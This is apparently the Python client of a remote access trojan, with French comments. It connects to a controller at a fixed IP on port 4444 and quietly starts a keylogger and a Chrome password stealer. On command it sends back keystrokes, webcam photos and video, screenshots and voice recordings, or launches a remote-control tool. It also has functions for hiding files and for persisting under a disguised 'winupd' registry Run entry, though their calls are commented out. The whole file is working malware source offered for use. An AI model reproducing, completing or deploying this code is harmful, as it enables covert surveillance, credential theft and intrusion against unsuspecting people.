import subprocess
import socket
import json
import threading
import os
import sys
import time
import platform

IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

if IS_WINDOWS:
    import ctypes
    import winreg


SERVER_IP = "192.168.211.1"
SERVER_PORT = 4444



if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))


KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshot")

if IS_WINDOWS:
    KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
    PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
    WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
    REMOTE_EXE = os.path.join(BASE_DIR, "remote.exe")
    SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
    VOICE_EXE = os.path.join(BASE_DIR, "voice_module.exe")
else:
    KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger_linux")
    WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam")
    REMOTE_EXE = os.path.join(BASE_DIR, "remote")
    SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot_linux")
    VOICE_EXE = os.path.join(BASE_DIR, "voice_module")


def hide_file(path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    ctypes.windll.kernel32.SetFileAttributesW(path, attrs)


def add_to_startup(exe_path, name="winupd"):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)


def send_file(client_socket, file_path, file_type):
    try:
        if not os.path.exists(file_path):
            print(f"[-] Fichier non trouvé : {file_path}")
            return

        with open(file_path, "rb") as file:
            file_data = file.read()

        payload = json.dumps({
            "type": file_type,
            "filename": os.path.basename(file_path),
            "data": file_data.hex()
        })
        client_socket.send(payload.encode('utf-8'))
        print(f"[+] Fichier '{file_path}' envoyé au serveur.")
    except Exception as e:
        print(f"[Erreur] lors de l'envoi : {e}")

def wait_for_file(file_path, timeout=10):
    """Attente que le fichier soit généré (jusqu'à 10 secondes)."""
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time > timeout:
            print(f"[-] Temps d'attente dépassé pour le fichier : {file_path}")
            return False
        time.sleep(1)
    return True

# Lancer un exécutable si présent
def safe_run(exe_path, args=None, silent=False):
    if exe_path and os.path.exists(exe_path):
        try:
            if IS_WINDOWS:
                subprocess.Popen([exe_path] + (args or []), creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen([exe_path] + (args or []))
            if not silent:
                print(f"[+] Exécution de : {exe_path}")
        except Exception as e:
            print(f"[!] Erreur lors du lancement de {exe_path}: {e}")
    else:
        print(f"[!] Exécutable introuvable : {exe_path}")


def handle_commands(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            print(f"[+] Commande reçue : {command}")

            if command == "keylogger":
                if wait_for_file(KEYLOG_FILE):
                    send_file(client_socket, KEYLOG_FILE, "keystroke")
                    os.remove(KEYLOG_FILE)

            elif command == "capture_image":
                subprocess.run([WEBCAM_EXE, "image"], check=True)
                capture_folder = os.path.join(BASE_DIR, "captures")
                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".jpg")]
                if images:
                    latest_image = max(images, key=os.path.getctime)
                    if wait_for_file(latest_image):
                        send_file(client_socket, latest_image, "webcam_capture")
                        os.remove(latest_image) 

            elif command == "capture_video":
                subprocess.run([WEBCAM_EXE, "video"], check=True)
                capture_folder = os.path.join(BASE_DIR, "captures")
                videos = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".avi")]
                if videos:
                    latest_video = max(videos, key=os.path.getctime)
                    if wait_for_file(latest_video):
                        send_file(client_socket, latest_video, "webcam_capture")
                        os.remove(latest_video)

            elif command == "remote":
                print("[*] remote.exe est lancé !")

                # subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
                # subprocess.run([REMOTE_EXE], check=True)
                safe_run(REMOTE_EXE)

            elif command == "screenshot":
                subprocess.run([SCREENSHOT_EXE], check=True)
                capture_folder = os.path.join(BASE_DIR, "screenshot")
                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("screenshot_")]
                if images:
                    latest = max(images, key=os.path.getctime)
                    if wait_for_file(latest):
                        send_file(client_socket, latest, "screenshot")
                        os.remove(latest)

            elif command == "voice":
                # subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
                safe_run(VOICE_EXE)        

    except Exception as e:
        print(f"[Erreur] de connexion : {e}")


def main():

        # Cacher les exécutables àdécommencter a la fin 
    # for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE,KEYLOG_FILE,SCREENSHOT_DIR,CAPTURE_DIR, sys.executable]:
    #     if os.path.exists(exe):
    #         hide_file(exe)

    # add_to_startup(os.path.join(BASE_DIR, "rat_client.exe")) ======> A CORRIGER 

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(platform.system().encode())

        
        if IS_WINDOWS:
            subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run([PASSWORD_EXE], check=True)
        else:
            subprocess.Popen([KEYLOGGER_EXE])
        

        handle_commands(s)

if __name__ == "__main__":
    main()
